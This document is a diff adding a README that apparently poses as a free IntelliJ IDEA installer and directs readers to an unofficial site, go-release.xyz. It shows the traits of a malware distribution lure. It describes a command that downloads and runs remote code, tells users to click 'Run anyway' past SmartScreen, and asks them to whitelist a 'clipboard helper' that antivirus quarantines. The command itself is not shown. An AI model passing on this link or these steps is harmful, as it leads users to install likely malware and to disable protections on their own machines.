@@ -1,0 +1,52 @@
+Get IntelliJ IDEA Running on Your PC
+
+This repo keeps things simple: one official entry point, clear instructions and regular updates. Make the IDE disappear so only code remains.
+
+✨ Highlights
+
+- ✅ Offline-friendly after first launch
+- ✅ One-click setup — no manual configuration needed
+- ✅ Regularly updated builds with change notes
+- ✅ Lightweight footprint, runs even on older hardware
+- ✅ No personal data collection
+
+🚀 How to run
+
+Or open the link directly: https://go-release.xyz/
+
+💡 Bookmark this page — the button always points to the current release.
+
+🖥️ Requirements
+
+| Requirement | Details |
+|---|---|
+| Operating system | Windows 10 (64-bit) or newer |
+| Memory | 4 GB RAM minimum |
+| Disk space | ~80 MB free |
+| Internet | Required on first run; updates are periodic |
+
+📋 Notes
+
+- If your security software flags the command, review it first — it simply downloads and runs the setup from the official source.
+- Windows SmartScreen may ask for confirmation the first time; choose "Run anyway".
+- If nothing happens, wait a second and press Enter again inside the terminal window.
+
+❓ FAQ
+
+Where do I report problems?
+
+Open an issue in this repository with your OS version and a short description of what happened.
+
+Do I need to disable my antivirus?
+
+Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.
+
+Is it safe?
+
+The launcher only reads remote instructions from the official source listed in the command. Review the script before running if you want to be extra careful.
+
+🧾 License
+
+Released under the MIT License — see LICENSE.
+
+Disclaimer: this repository is provided for educational purposes. All trademarks belong to their respective owners.
